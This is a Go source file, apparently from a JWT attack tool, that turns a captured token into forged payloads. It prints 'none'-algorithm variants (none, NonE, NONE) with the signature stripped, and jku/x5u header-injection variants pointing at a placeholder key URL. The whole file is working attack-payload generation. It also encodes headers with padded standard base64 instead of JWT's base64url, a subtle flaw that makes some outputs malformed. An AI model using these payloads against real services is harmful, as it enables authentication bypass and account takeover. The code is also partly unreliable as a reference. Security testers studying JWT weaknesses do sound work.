package paylaod

import (
	b64 "encoding/base64"
	"fmt"
	"os"
	"strings"

	"github.com/dgrijalva/jwt-go"
	"github.com/sirupsen/logrus"
)

var log = logrus.New()

// GenerateAllPayloads is printing all payloads
func GenerateAllPayloads(token *jwt.Token) {
	log.Out = os.Stdout
	GenerateNonePayloads(token.Raw)
	GenerateUrlPayloads(token.Raw)
}

// GenerateNonePayloads is printing none payloads
func GenerateNonePayloads(token string) {
	tokens := strings.Split(token, ".")
	claims := tokens[1]
	var pattern = []string{
		"none",
		"NonE",
		"NONE",
	}

	for k, v := range pattern {
		_ = k
		header := "{\"alg\":\"" + v + "\",\"typ\":\"JWT\"}"
		baseHeader := b64.StdEncoding.EncodeToString([]byte(header))
		log.WithFields(logrus.Fields{
			"payload": v,
			"header":   header,
		}).Info("Generate "+v+" payload")
		fmt.Println(baseHeader + "." + claims + ".")
	}

}

// GenerateUrlPayloads is printing jku / x5u paylaod
func GenerateUrlPayloads(token string) {
	tokens := strings.Split(token, ".")
	claims := tokens[1]
	var pattern = []string{
		"jku",
		"x5u",
	}

	for k, v := range pattern {
		_ = k
		header := "{\"alg\":\"hs256\",\"" + v + "\":\"https://www.google.com\",\"typ\":\"JWT\"}"
		baseHeader := b64.StdEncoding.EncodeToString([]byte(header))
		log.WithFields(logrus.Fields{
			"payload": v,
			"header":   header,
		}).Info("Generate "+v+" payload")
		fmt.Println(baseHeader + "." + claims + ".")
	}
	
}
